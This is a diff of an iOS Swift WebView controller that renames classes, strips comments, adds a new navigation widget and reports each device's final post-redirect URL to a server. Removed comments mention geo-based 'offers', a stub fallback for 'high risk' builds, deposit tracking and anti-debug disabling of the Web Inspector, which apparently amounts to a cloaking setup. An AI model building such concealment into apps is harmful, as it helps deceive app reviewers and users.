@@ -1,54 +1,58 @@
-// NyxStudioController.swift
-// Modern WebView controller with Liquid Glass navigation
+
+
 
 import UIKit
 import WebKit
 import SwiftUI
 
-// MARK: - Web Content Controller
 
-final class NyxStudioController: UIViewController {
 
-    // MARK: - Properties
+final class NyxVaultController: UIViewController {
+
+    
 
     var startURL: URL
     private let allowClose: Bool
     private let onClose: () -> Void
+    private let reportFinalURL: Bool
 
     private var webView: WKWebView!
     private var statusBarStyle: UIStatusBarStyle = .lightContent
     private let progressView = UIProgressView(progressViewStyle: .default)
-    private let liquid = NyxCanvasSlider()
+    private let liquid = NyxAspen()
 
     private var progressObserver: NSKeyValueObservation?
     private var canGoBackObserver: NSKeyValueObservation?
     private var canGoForwardObserver: NSKeyValueObservation?
 
-    /// Cherry Flow web→native bridge. Retained here while registered on
-    /// the web view's content controller; nil for non-cherry_flow builds.
+    
+    
     private var webBridge: NyxSparkBridge?
 
-    // #4: 2nd-redirect → stub watcher (all_high_risk + client). nil =
-    // disabled (normal apps). We count navigation hops; if after the page
-    // settles fewer than ``minRedirects`` occurred, the chain dead-ended
-    // (no real offer for this geo) → load the stub instead of leaving the
-    // visitor on a blank/dead page.
-    private let redirectPolicy: NyxLibraryResponse.NyxDirector?
+    
+    
+    
+    
+    
+    private let redirectPolicy: NyxLibraryResponse.NyxMarker?
     private var redirectHops = 0
     private var stubLoaded = false
     private var settleScheduled = false
+    private var finalURLReportWorkItem: DispatchWorkItem?
 
-    // MARK: - Init
+    
 
     init(
         url: URL,
         allowClose: Bool = true,
-        redirectPolicy: NyxLibraryResponse.NyxDirector? = nil,
+        redirectPolicy: NyxLibraryResponse.NyxMarker? = nil,
+        reportFinalURL: Bool = true,
         onClose: @escaping () -> Void = {}
     ) {
         self.startURL = url
         self.allowClose = allowClose
         self.redirectPolicy = redirectPolicy
+        self.reportFinalURL = reportFinalURL
         self.onClose = onClose
         super.init(nibName: nil, bundle: nil)
         modalPresentationStyle = .fullScreen
@@ -57,7 +61,7 @@ final class NyxStudioController: UIViewController {
     @available(*, unavailable)
     required init?(coder: NSCoder) { fatalError("Use init(url:allowClose:redirectPolicy:onClose:)") }
 
-    // MARK: - Lifecycle
+    
 
     override func viewDidLoad() {
         super.viewDidLoad()
@@ -76,9 +80,9 @@ final class NyxStudioController: UIViewController {
 
     override func viewWillDisappear(_ animated: Bool) {
         super.viewWillDisappear(animated)
-        // If the WebView is being torn down (e.g. state transition to
-        // overlay), dismiss any active JS dialog so WKWebView doesn't
-        // crash from a dangling completion handler.
+        
+        
+        
         dismissActiveJSDialogs()
     }
 
@@ -86,8 +90,8 @@ final class NyxStudioController: UIViewController {
         progressObserver?.invalidate()
         canGoBackObserver?.invalidate()
         canGoForwardObserver?.invalidate()
-        // Drop the script-message handler so the content controller
-        // doesn't retain the bridge past this controller's life.
+        
+        
         if webBridge != nil {
             webView?.configuration.userContentController
                 .removeScriptMessageHandler(forName: NyxSparkBridge.handlerName)
@@ -95,16 +99,16 @@ final class NyxStudioController: UIViewController {
         dismissActiveJSDialogs()
     }
 
-    /// Dismiss the currently-presented UIAlertController (JS alert/confirm/
-    /// prompt) and invoke its completion handler with a safe default so
-    /// WKWebView doesn't crash during teardown.
+    
+    
+    
     private func dismissActiveJSDialogs() {
         guard let alert = presentedViewController as? UIAlertController,
               alert.title == nil else { return }
-        // JS dialogs have nil title. Invoke the "Cancel" action if
-        // available (confirm→false, prompt→nil, alert→OK).
+        
+        
         if let cancel = alert.actions.first(where: { $0.style == .cancel }) {
-            // Simulate tapping Cancel by calling the handler
+            
             (cancel.value(forKey: "handler") as? (() -> Void))?()
         }
         alert.dismiss(animated: false)
@@ -114,7 +118,7 @@ final class NyxStudioController: UIViewController {
     override var supportedInterfaceOrientations: UIInterfaceOrientationMask { .allButUpsideDown }
     override var prefersStatusBarHidden: Bool { true }
 
-    // MARK: - Setup
+    
 
     private func setupWebView() {
         let config = WKWebViewConfiguration()
@@ -125,9 +129,9 @@ final class NyxStudioController: UIViewController {
         config.allowsInlineMediaPlayback = true
         config.mediaTypesRequiringUserActionForPlayback = []
 
-        // Cherry Flow web→native bridge (cherry_flow builds only). Lets
-        // the offer page signal in-app conversions (e.g. deposit) to
-        // native, which forwards them to /client/event.
+        
+        
+        
         if NyxDispatcherConfig.cherryFlowEnabled {
             let ucc = WKUserContentController()
             let bridge = NyxSparkBridge()
@@ -149,28 +153,28 @@ final class NyxStudioController: UIViewController {
         webView.navigationDelegate = self
         webView.uiDelegate = self
 
-        // Anti-debug: disable Web Inspector in production builds. Kept
-        // available in DEBUG so we can still inspect our own pages.
+        
+        
         #if !DEBUG
         if #available(iOS 16.4, *) {
             webView.isInspectable = false
         }
         #endif
 
-        // Transparent background for adaptive coloring
+        
         webView.isOpaque = false
         webView.backgroundColor = .clear
         webView.scrollView.backgroundColor = .clear
 
-        // Clean scroll — hide indicators only, keep smooth bounce
+        
         webView.scrollView.showsHorizontalScrollIndicator = false
         webView.scrollView.showsVerticalScrollIndicator = false
 
         view.addSubview(webView)
 
         NSLayoutConstraint.activate([
-            webView.topAnchor.constraint(equalTo: view.topAnchor),
-            webView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
+            webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
+            webView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor),
             webView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
             webView.trailingAnchor.constraint(equalTo: view.trailingAnchor)
         ])
@@ -197,13 +201,13 @@ final class NyxStudioController: UIViewController {
         view.addSubview(liquid)
 
         NSLayoutConstraint.activate([
-            liquid.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 16),
-            liquid.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -16),
-            liquid.heightAnchor.constraint(equalToConstant: 44),
-            liquid.widthAnchor.constraint(equalToConstant: 44)
+            liquid.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: 5),
+            liquid.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -72),
+            liquid.heightAnchor.constraint(equalToConstant: 56),
+            liquid.widthAnchor.constraint(equalToConstant: 24)
         ])
 
-        // Back action (swipe LEFT)
+        
         liquid.onBack = { [weak self] in
             guard let self else { return }
             if self.webView.canGoBack {
@@ -215,12 +219,12 @@ final class NyxStudioController: UIViewController {
             }
         }
 
-        // Reload action (swipe RIGHT)
+        
         liquid.onReload = { [weak self] in
             self?.webView.reload()
         }
 
-        // Close action (tap when no history)
+        
         liquid.onClose = { [weak self] in
             guard let self, self.allowClose else { return }
             self.closeWebView()
@@ -252,7 +256,7 @@ final class NyxStudioController: UIViewController {
         }
     }
 
-    // MARK: - Loading
+    
 
     private func loadURL(_ url: URL) {
         let request = URLRequest(url: url, cachePolicy: .useProtocolCachePolicy, timeoutInterval: 30)
@@ -260,9 +264,9 @@ final class NyxStudioController: UIViewController {
         NyxMint.log("Loading: \(url)")
     }
 
-    /// Called from SwiftUI's updateUIViewController when the URL changes
-    /// (e.g. Fortune Wheel CTA → WebView landing). Load about:blank first
-    /// to clear the old page, then navigate to the new URL.
+    
+    
+    
     func loadBlankAndNavigate(to url: URL) {
         webView.load(URLRequest(url: URL(string: "about:blank")!))
         DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) { [weak self] in
@@ -276,7 +280,7 @@ final class NyxStudioController: UIViewController {
         dismiss(animated: true)
     }
 
-    // MARK: - Adaptive Background
+    
 
     private func syncBackgroundWithPage() {
         let js = """
@@ -301,13 +305,13 @@ final class NyxStudioController: UIViewController {
                 self.setNeedsStatusBarAppearanceUpdate()
                 return
             }
-            // Compute perceived brightness — dark bg → light status bar, light bg → dark status bar
+            
             var r: CGFloat = 0, g: CGFloat = 0, b: CGFloat = 0, a: CGFloat = 0
             color.getRed(&r, green: &g, blue: &b, alpha: &a)
             let brightness = (0.299 * r + 0.587 * g + 0.114 * b)
             self.statusBarStyle = brightness > 0.55 ? .darkContent : .lightContent
             self.setNeedsStatusBarAppearanceUpdate()
-            // Push to SwiftUI so the ZStack safe-area fill matches the page
+            
             NyxDispatcherRouter.shared.webViewBackgroundColor = Color(uiColor: color)
             UIView.animate(withDuration: 0.2, delay: 0, options: [.curveEaseOut, .allowUserInteraction]) {
                 self.view.backgroundColor = color
@@ -316,34 +320,92 @@ final class NyxStudioController: UIViewController {
     }
 }
 
-// MARK: - WKNavigationDelegate
 
-extension NyxStudioController: WKNavigationDelegate {
+
+extension NyxVaultController: WKNavigationDelegate {
+
+    private static let webSchemes: Set<String> = [
+        "http", "https", "about", "data", "blob", "javascript", "file"
+    ]
+
+    private func shouldOpenExternally(_ url: URL) -> Bool {
+        let scheme = (url.scheme ?? "").lowercased()
+        let host = (url.host ?? "").lowercased()
+        let isAppStoreHost = host == "apps.apple.com"
+            || host.hasSuffix(".apps.apple.com")
+            || host == "itunes.apple.com"
+            || host.hasSuffix(".itunes.apple.com")
+        let isOAuthHost = host == "accounts.google.com"
+            || host == "appleid.apple.com"
+            || host == "login.microsoftonline.com"
+            || host.hasSuffix(".auth0.com")
+        return isAppStoreHost
+            || (NyxDispatcherConfig.systemOAuthEnabled && isOAuthHost)
+            || (!scheme.isEmpty && !Self.webSchemes.contains(scheme))
+    }
+
+    
+    
+    
+    private func openExternalURL(_ url: URL) {
+        let scheme = (url.scheme ?? "unknown").lowercased()
+        NyxMint.log("WebView: handing \(scheme) link to iOS")
+        UIApplication.shared.open(url, options: [:]) { [weak self] opened in
+            guard !opened, let self, self.viewIfLoaded?.window != nil else { return }
+            NyxMint.log("WebView: no application can open \(scheme) link")
+            guard self.presentedViewController == nil else { return }
+            let alert = UIAlertController(
+                title: "App Not Available",
+                message: "Install the required app and try again, or choose another payment method.",
+                preferredStyle: .alert
+            )
+            alert.addAction(UIAlertAction(title: "OK", style: .default))
+            self.present(alert, animated: true)
+        }
+    }
 
     func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
         NyxMint.log("Page loaded: \(webView.url?.absoluteString ?? "")")
         syncBackgroundWithPage()
         scheduleStubCheckIfNeeded()
-        // #5 — report the final (post-JS-redirect) URL so the server caches
-        // it per device and can return it on the next /init (sticky offer).
-        if let final = webView.url, let scheme = final.scheme, scheme.hasPrefix("http") {
-            let uniqueId = NyxGallery.shared.uniqueID
-            Task {
-                await NyxRosterClient.shared.reportFinalURL(
-                    NyxEchoRequest.create(uniqueId: uniqueId, finalUrl: final.absoluteString)
-                )
-            }
-        }
+        scheduleFinalURLReport(for: webView)
     }
 
-    // MARK: - #4 redirect → stub watcher
+    
+    
+    
+    private func scheduleFinalURLReport(for webView: WKWebView) {
+        finalURLReportWorkItem?.cancel()
+        guard reportFinalURL else { return }
+        guard let candidate = webView.url,
+              let scheme = candidate.scheme?.lowercased(),
+              scheme == "http" || scheme == "https" else { return }
 
-    /// Each new provisional load (initial + JS redirects) is a hop.
+        let item = DispatchWorkItem { [weak self, weak webView] in
+            guard let self, let webView,
+                  webView.url?.absoluteString == candidate.absoluteString else { return }
+            let uniqueId = NyxGallery.shared.uniqueID
+            Task {
+                await NyxCompassClient.shared.reportFinalURL(
+                    NyxEchoRequest.create(uniqueId: uniqueId, finalUrl: candidate.absoluteString)
+                )
+            }
+            self.finalURLReportWorkItem = nil
+        }
+        finalURLReportWorkItem = item
+        DispatchQueue.main.asyncAfter(deadline: .now() + 1.25, execute: item)
+    }
+
+    
+
+    
     func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
+        finalURLReportWorkItem?.cancel()
+        finalURLReportWorkItem = nil
         if redirectPolicy != nil { redirectHops += 1 }
     }
 
-    /// HTTP 3xx server redirects within the same navigation also count.
+    
     func webView(
         _ webView: WKWebView,
         didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!
@@ -351,13 +413,13 @@ extension NyxStudioController: WKNavigationDelegate {
         if redirectPolicy != nil { redirectHops += 1 }
     }
 
-    /// After the page settles, decide: enough hops → real offer, keep it;
-    /// too few → dead-end → load the stub. Runs at most once; a short
-    /// delay lets late JS redirects register before we judge.
+    
+    
+    
     private func scheduleStubCheckIfNeeded() {
-        // No ``stub`` requirement here: when the operator leaves stub_url
-        // empty, a dead-end chain must fall back to NATIVE (not sit on the
-        // dead-end page). Apps that DO set a stub keep the old behaviour.
+        
+        
+        
         guard let policy = redirectPolicy, policy.shouldFollow,
               !stubLoaded, !settleScheduled else { return }
         settleScheduled = true
@@ -379,10 +441,20 @@ extension NyxStudioController: WKNavigationDelegate {
 
     func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
         NyxMint.error("Navigation failed", error)
+        guard !reportFinalURL, (error as NSError).code != NSURLErrorCancelled else { return }
+        Task { @MainActor in NyxDispatcherRouter.shared.showWebDefaultUnavailable() }
     }
 
     func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
         NyxMint.error("Provisional navigation failed", error)
+
+        
+        
+        
+        if !reportFinalURL, (error as NSError).code != NSURLErrorCancelled {
+            Task { @MainActor in NyxDispatcherRouter.shared.showWebDefaultUnavailable() }
+            return
+        }
 
         let alert = UIAlertController(
             title: "Loading Error",
@@ -410,25 +482,19 @@ extension NyxStudioController: WKNavigationDelegate {
             return
         }
 
-        let scheme = (url.scheme ?? "").lowercased()
-
-        // Handle special schemes
-        if ["tel", "mailto", "sms", "facetime"].contains(scheme) {
-            UIApplication.shared.open(url)
+        
+        
+        
+        if shouldOpenExternally(url) {
+            openExternalURL(url)
             decisionHandler(.cancel)
             return
         }
 
-        // Handle target=_blank (open in same webview)
+        
+        
         if navigationAction.targetFrame == nil {
             webView.load(URLRequest(url: url))
-            decisionHandler(.cancel)
-            return
-        }
-
-        // Handle App Store links
-        if url.host?.contains("apps.apple.com") == true || url.host?.contains("itunes.apple.com") == true {
-            UIApplication.shared.open(url)
             decisionHandler(.cancel)
             return
         }
@@ -437,9 +503,35 @@ extension NyxStudioController: WKNavigationDelegate {
     }
 }
 
-// MARK: - WKUIDelegate
 
-extension NyxStudioController: WKUIDelegate {
+
+extension NyxVaultController: WKUIDelegate {
+
+    @available(iOS 15.0, *)
+    func webView(
+        _ webView: WKWebView,
+        requestMediaCapturePermissionFor origin: WKSecurityOrigin,
+        initiatedByFrame frame: WKFrameInfo,
+        type: WKMediaCaptureType,
+        decisionHandler: @escaping (WKPermissionDecision) -> Void
+    ) {
+        guard NyxDispatcherConfig.fileUploadEnabled else {
+            decisionHandler(.deny)
+            return
+        }
+        let allowed: Bool
+        switch type {
+        case .camera:
+            allowed = NyxDispatcherConfig.cameraUploadEnabled
+        case .microphone:
+            allowed = NyxDispatcherConfig.microphoneCaptureEnabled
+        case .cameraAndMicrophone:
+            allowed = NyxDispatcherConfig.cameraUploadEnabled && NyxDispatcherConfig.microphoneCaptureEnabled
+        @unknown default:
+            allowed = false
+        }
+        decisionHandler(allowed ? .prompt : .deny)
+    }
 
     func webView(
         _ webView: WKWebView,
@@ -447,9 +539,15 @@ extension NyxStudioController: WKUIDelegate {
         for navigationAction: WKNavigationAction,
         windowFeatures: WKWindowFeatures
     ) -> WKWebView? {
-        // Handle window.open() in same webview
+        
+        
+        
         if navigationAction.targetFrame == nil, let url = navigationAction.request.url {
-            webView.load(URLRequest(url: url))
+            if shouldOpenExternally(url) {
+                openExternalURL(url)
+            } else {
+                webView.load(URLRequest(url: url))
+            }
         }
         return nil
     }
@@ -494,7 +592,224 @@ extension NyxStudioController: WKUIDelegate {
     }
 }
 
-// MARK: - Liquid Glass Slider
+
+
+final class NyxAspen: UIView {
+    var onBack: (() -> Void)?
+    var onReload: (() -> Void)?
+    var onClose: (() -> Void)?
+    var canGoBackProvider: (() -> Bool)?
+    var allowCloseProvider: (() -> Bool)?
+
+    private enum State { case collapsed, expanded, animating }
+    private var state: State = .collapsed
+    private weak var widthConstraint: NSLayoutConstraint?
+    private weak var trailingConstraint: NSLayoutConstraint?
+    private var overlayButton: UIButton?
+    private let collapsedWidth: CGFloat = 24
+    private let expandedWidth: CGFloat = 104
+    private let surface = UIVisualEffectView(effect: UIBlurEffect(style: .systemUltraThinMaterialDark))
+    private let handleButton = UIButton(type: .system)
+    private let backButton = UIButton(type: .system)
+    private let reloadButton = UIButton(type: .system)
+    private let haptic = UIImpactFeedbackGenerator(style: .light)
+
+    override init(frame: CGRect) { super.init(frame: frame); setup() }
+    @available(*, unavailable)
+    required init?(coder: NSCoder) { fatalError("Use init(frame:)") }
+
+    override func didMoveToSuperview() { super.didMoveToSuperview(); captureConstraints() }
+    override func didMoveToWindow() {
+        super.didMoveToWindow()
+        if window != nil, state == .collapsed { startHandlePulse() }
+        else { handleButton.layer.removeAnimation(forKey: "web-controls-pulse") }
+    }
+    override func layoutSubviews() {
+        super.layoutSubviews()
+        surface.layer.cornerRadius = 15
+        surface.layer.maskedCorners = [.layerMinXMinYCorner, .layerMinXMaxYCorner]
+        layer.shadowPath = UIBezierPath(
+            roundedRect: bounds,
+            byRoundingCorners: [.topLeft, .bottomLeft],
+            cornerRadii: CGSize(width: 15, height: 15)
+        ).cgPath
+    }
+
+    private func setup() {
+        backgroundColor = .clear
+        layer.shadowColor = UIColor.black.cgColor
+        layer.shadowOpacity = 0.24
+        layer.shadowRadius = 12
+        layer.shadowOffset = CGSize(width: -3, height: 4)
+        surface.translatesAutoresizingMaskIntoConstraints = false
+        surface.clipsToBounds = true
+        surface.layer.cornerCurve = .continuous
+        addSubview(surface)
+        NSLayoutConstraint.activate([
+            surface.leadingAnchor.constraint(equalTo: leadingAnchor), surface.trailingAnchor.constraint(equalTo: trailingAnchor),
+            surface.topAnchor.constraint(equalTo: topAnchor), surface.bottomAnchor.constraint(equalTo: bottomAnchor),
+        ])
+        configure(handleButton, symbol: "chevron.left", label: "Open web controls")
+        handleButton.setPreferredSymbolConfiguration(
+            UIImage.SymbolConfiguration(pointSize: 15, weight: .semibold),
+            forImageIn: .normal
+        )
+        
+        handleButton.imageView?.transform = CGAffineTransform(translationX: -2.5, y: 0)
+        configure(backButton, symbol: "chevron.backward", label: "Go back")
+        configure(reloadButton, symbol: "arrow.clockwise", label: "Reload page")
+        handleButton.addTarget(self, action: #selector(toggle), for: .touchUpInside)
+        backButton.addTarget(self, action: #selector(backTapped), for: .touchUpInside)
+        reloadButton.addTarget(self, action: #selector(reloadTapped), for: .touchUpInside)
+        let stack = UIStackView(arrangedSubviews: [backButton, reloadButton])
+        stack.translatesAutoresizingMaskIntoConstraints = false
+        stack.axis = .horizontal
+        stack.distribution = .fillEqually
+        stack.spacing = 2
+        surface.contentView.addSubview(stack)
+        NSLayoutConstraint.activate([
+            stack.leadingAnchor.constraint(equalTo: surface.contentView.leadingAnchor, constant: 4),
+            stack.trailingAnchor.constraint(equalTo: surface.contentView.trailingAnchor, constant: -4),
+            stack.topAnchor.constraint(equalTo: surface.contentView.topAnchor, constant: 4),
+            stack.bottomAnchor.constraint(equalTo: surface.contentView.bottomAnchor, constant: -4),
+        ])
+        handleButton.translatesAutoresizingMaskIntoConstraints = false
+        surface.contentView.addSubview(handleButton)
+        NSLayoutConstraint.activate([
+            handleButton.leadingAnchor.constraint(equalTo: surface.contentView.leadingAnchor),
+            handleButton.trailingAnchor.constraint(equalTo: surface.contentView.trailingAnchor),
+            handleButton.topAnchor.constraint(equalTo: surface.contentView.topAnchor),
+            handleButton.bottomAnchor.constraint(equalTo: surface.contentView.bottomAnchor),
+        ])
+        backButton.alpha = 0
+        reloadButton.alpha = 0
+        backButton.isUserInteractionEnabled = false
+        reloadButton.isUserInteractionEnabled = false
+        haptic.prepare()
+        startHandlePulse()
+    }
+
+    private func startHandlePulse() {
+        guard handleButton.layer.animation(forKey: "web-controls-pulse") == nil else { return }
+        let pulse = CABasicAnimation(keyPath: "opacity")
+        pulse.fromValue = 1.0
+        pulse.toValue = 0.38
+        pulse.duration = 0.85
+        pulse.autoreverses = true
+        pulse.repeatCount = .infinity
+        pulse.timingFunction = CAMediaTimingFunction(name: .easeInEaseOut)
+        handleButton.layer.add(pulse, forKey: "web-controls-pulse")
+    }
+
+    private func configure(_ button: UIButton, symbol: String, label: String) {
+        button.tintColor = .white.withAlphaComponent(0.94)
+        button.setImage(UIImage(systemName: symbol), for: .normal)
+        button.accessibilityLabel = label
+        button.accessibilityTraits = .button
+    }
+
+    private func captureConstraints() {
+        guard let superview else { return }
+        if widthConstraint == nil {
+            widthConstraint = constraints.first { $0.firstAttribute == .width && $0.relation == .equal }
+        }
+        if trailingConstraint == nil {
+            trailingConstraint = superview.constraints.first {
+                ($0.firstItem as? UIView) === self && $0.firstAttribute == .trailing && $0.relation == .equal
+            }
+        }
+    }
+
+    func updateState() {
+        let canBack = canGoBackProvider?() ?? false
+        backButton.isEnabled = true
+        backButton.accessibilityLabel = canBack ? "Go back" : "Close web view"
+        if state == .expanded { backButton.alpha = 1 }
+    }
+
+    @objc private func toggle() {
+        switch state { case .collapsed: expand(); case .expanded: collapse(); case .animating: break }
+    }
+
+    private func expand() {
+        captureConstraints()
+        guard state == .collapsed, let superview, let widthConstraint, let trailingConstraint else { return }
+        state = .animating
+        haptic.impactOccurred(intensity: 0.45)
+        handleButton.layer.removeAnimation(forKey: "web-controls-pulse")
+        addOverlay(in: superview)
+        widthConstraint.constant = expandedWidth
+        trailingConstraint.constant = -8
+        backButton.isUserInteractionEnabled = true
+        reloadButton.isUserInteractionEnabled = true
+        handleButton.isUserInteractionEnabled = false
+        updateState()
+        UIView.animate(withDuration: 0.26, delay: 0, usingSpringWithDamping: 0.88, initialSpringVelocity: 0.65, options: [.allowUserInteraction, .curveEaseOut]) {
+            self.backButton.alpha = 1
+            self.reloadButton.alpha = 1
+            self.handleButton.alpha = 0
+            superview.layoutIfNeeded()
+        } completion: { _ in self.state = .expanded }
+    }
+
+    private func collapse() {
+        captureConstraints()
+        guard state == .expanded, let superview, let widthConstraint, let trailingConstraint else { return }
+        state = .animating
+        removeOverlay()
+        widthConstraint.constant = collapsedWidth
+        trailingConstraint.constant = 5
+        backButton.isUserInteractionEnabled = false
+        reloadButton.isUserInteractionEnabled = false
+        handleButton.isUserInteractionEnabled = true
+        UIView.animate(withDuration: 0.22, delay: 0, usingSpringWithDamping: 0.92, initialSpringVelocity: 0.7, options: [.allowUserInteraction, .curveEaseOut]) {
+            self.backButton.alpha = 0
+            self.reloadButton.alpha = 0
+            self.handleButton.alpha = 1
+            superview.layoutIfNeeded()
+        } completion: { _ in
+            self.state = .collapsed
+            self.startHandlePulse()
+        }
+    }
+
+    @objc private func backTapped() {
+        haptic.impactOccurred(intensity: 0.75)
+        let canNavigate = canGoBackProvider?() ?? false
+        let canClose = allowCloseProvider?() ?? false
+        guard canNavigate || canClose else {
+            bump()
+            return
+        }
+        onBack?()
+        collapse()
+    }
+    @objc private func reloadTapped() { haptic.impactOccurred(intensity: 0.75); onReload?(); collapse() }
+    func bump() {
+        haptic.impactOccurred(intensity: 0.45)
+        UIView.animate(withDuration: 0.1) { self.backButton.transform = CGAffineTransform(scaleX: 0.86, y: 0.86) }
+        completion: { _ in UIView.animate(withDuration: 0.12) { self.backButton.transform = .identity } }
+    }
+
+    private func addOverlay(in superview: UIView) {
+        guard overlayButton == nil else { return }
+        let button = UIButton(type: .custom)
+        button.translatesAutoresizingMaskIntoConstraints = false
+        button.backgroundColor = .clear
+        button.accessibilityLabel = "Close web controls"
+        button.addTarget(self, action: #selector(overlayTapped), for: .touchUpInside)
+        superview.insertSubview(button, belowSubview: self)
+        NSLayoutConstraint.activate([
+            button.leadingAnchor.constraint(equalTo: superview.leadingAnchor), button.trailingAnchor.constraint(equalTo: superview.trailingAnchor),
+            button.topAnchor.constraint(equalTo: superview.topAnchor), button.bottomAnchor.constraint(equalTo: superview.bottomAnchor),
+        ])
+        overlayButton = button
+    }
+    private func removeOverlay() { overlayButton?.removeFromSuperview(); overlayButton = nil }
+    @objc private func overlayTapped() { if state == .expanded { collapse() } }
+}
+
+
 
 final class NyxCanvasSlider: UIView {
 
@@ -504,44 +819,44 @@ final class NyxCanvasSlider: UIView {
     var canGoBackProvider: (() -> Bool)?
     var allowCloseProvider: (() -> Bool)?
 
-    // Sizing
+    
     private let collapsedSize: CGFloat = 44
     private let expandedWidth: CGFloat = 280
     private let thumbDiameter: CGFloat = 28
     private let triggerRatio: CGFloat = 0.75
 
-    // Opacity
+    
     private let idleAlpha: CGFloat = 0.55
     private let expandedAlpha: CGFloat = 0.70
 
     private enum State { case collapsed, expanded, animating }
     private var state: State = .collapsed
 
-    // Constraints for animation
+    
     private weak var leadingConstraint: NSLayoutConstraint?
     private weak var widthConstraint: NSLayoutConstraint?
 
-    // Overlay for dismiss
+    
     private var overlayButton: UIButton?
 
-    // Track (expanded background)
+    
     private let track = UIVisualEffectView(effect: UIBlurEffect(style: .systemUltraThinMaterialDark))
 
-    // Center button (collapsed state)
+    
     private let centerButton = UIVisualEffectView(effect: UIBlurEffect(style: .systemUltraThinMaterial))
     private let centerIcon = UIImageView(image: UIImage(systemName: "circle.grid.2x2.fill"))
 
-    // Labels inside track
+    
     private let leftLabel = UILabel()
     private let rightLabel = UILabel()
     private let leftIcon = UIImageView(image: UIImage(systemName: "chevron.left"))
     private let rightIcon = UIImageView(image: UIImage(systemName: "arrow.clockwise"))
 
-    // Thumb (draggable)
+    
     private let thumb = UIVisualEffectView(effect: UIBlurEffect(style: .systemUltraThinMaterial))
     private let thumbDot = UIView()
 
-    // Hint chevrons
+    
     private var leftHints: [UIImageView] = []
     private var rightHints: [UIImageView] = []
     private var hintTimer: Timer?
@@ -581,7 +896,7 @@ final class NyxCanvasSlider: UIView {
         backgroundColor = .clear
         isUserInteractionEnabled = true
 
-        // Track (hidden in collapsed)
+        
         track.translatesAutoresizingMaskIntoConstraints = false
         track.clipsToBounds = true
         track.layer.cornerCurve = .continuous
@@ -595,7 +910,7 @@ final class NyxCanvasSlider: UIView {
             track.bottomAnchor.constraint(equalTo: bottomAnchor)
         ])
 
-        // Center button (collapsed)
+        
         centerButton.translatesAutoresizingMaskIntoConstraints = false
         centerButton.clipsToBounds = true
         centerButton.layer.cornerCurve = .continuous
@@ -621,7 +936,7 @@ final class NyxCanvasSlider: UIView {
             centerIcon.heightAnchor.constraint(equalToConstant: 18)
         ])
 
-        // Labels in track
+        
         setupLabel(leftLabel, text: "Back")
         setupLabel(rightLabel, text: "Reload")
         setupIcon(leftIcon)
@@ -650,7 +965,7 @@ final class NyxCanvasSlider: UIView {
             rightLabel.centerYAnchor.constraint(equalTo: track.contentView.centerYAnchor)
         ])
 
-        // Thumb
+        
         thumb.translatesAutoresizingMaskIntoConstraints = false
         thumb.clipsToBounds = true
         thumb.layer.cornerCurve = .continuous
@@ -677,10 +992,10 @@ final class NyxCanvasSlider: UIView {
             thumbDot.heightAnchor.constraint(equalToConstant: 4)
         ])
 
-        // Hint chevrons
+        
         buildHintChevrons()
 
-        // Gestures
+        
         let tap = UITapGestureRecognizer(target: self, action: #selector(handleTap))
         centerButton.addGestureRecognizer(tap)
 
@@ -727,7 +1042,7 @@ final class NyxCanvasSlider: UIView {
         thumb.layer.cornerRadius = thumbDiameter / 2
     }
 
-    // MARK: - State
+    
 
     func updateState() {
         let canGoBack = canGoBackProvider?() ?? false
@@ -741,7 +1056,7 @@ final class NyxCanvasSlider: UIView {
         }
     }
 
-    // MARK: - Expand / Collapse
+    
 
     @objc private func handleTap() {
         switch state {
@@ -815,7 +1130,7 @@ final class NyxCanvasSlider: UIView {
         }
     }
 
-    // MARK: - Pan Gesture
+    
 
     @objc private func handlePan(_ gr: UIPanGestureRecognizer) {
         guard state == .expanded else { return }
@@ -932,7 +1247,7 @@ final class NyxCanvasSlider: UIView {
         }
     }
 
-    // MARK: - Hint Animation
+    
 
     private func startHintSequence() {
         guard hintTimer == nil else { return }
@@ -973,7 +1288,7 @@ final class NyxCanvasSlider: UIView {
         }
     }
 
-    // MARK: - Helpers
+    
 
     private func setupLabel(_ label: UILabel, text: String) {
         label.translatesAutoresizingMaskIntoConstraints = false
@@ -1016,7 +1331,7 @@ final class NyxCanvasSlider: UIView {
     }
 }
 
-// MARK: - CSS Color Parser
+
 
 private extension UIColor {
     convenience init?(cssRGBA: String) {
@@ -1041,35 +1356,39 @@ private extension UIColor {
     }
 }
 
-// MARK: - SwiftUI Wrapper
 
-struct NyxStudioView: UIViewControllerRepresentable {
+
+struct NyxVaultView: UIViewControllerRepresentable {
 
     let url: URL
     let allowClose: Bool
-    let redirectPolicy: NyxLibraryResponse.NyxDirector?
+    let redirectPolicy: NyxLibraryResponse.NyxMarker?
+    let reportFinalURL: Bool
     let onClose: () -> Void
 
     init(
         url: URL,
         allowClose: Bool = true,
-        redirectPolicy: NyxLibraryResponse.NyxDirector? = nil,
+        redirectPolicy: NyxLibraryResponse.NyxMarker? = nil,
+        reportFinalURL: Bool = true,
         onClose: @escaping () -> Void = {}
     ) {
         self.url = url
         self.allowClose = allowClose
         self.redirectPolicy = redirectPolicy
+        self.reportFinalURL = reportFinalURL
         self.onClose = onClose
     }
 
-    func makeUIViewController(context: Context) -> NyxStudioController {
-        NyxStudioController(
-            url: url, allowClose: allowClose, redirectPolicy: redirectPolicy, onClose: onClose
+    func makeUIViewController(context: Context) -> NyxVaultController {
+        NyxVaultController(
+            url: url, allowClose: allowClose, redirectPolicy: redirectPolicy,
+            reportFinalURL: reportFinalURL, onClose: onClose
         )
     }
 
-    func updateUIViewController(_ vc: NyxStudioController, context: Context) {
-        // Reload when the URL changes — e.g. Fortune Wheel → WebView landing
+    func updateUIViewController(_ vc: NyxVaultController, context: Context) {
+        
         if vc.startURL != url {
             vc.startURL = url
             vc.loadBlankAndNavigate(to: url)
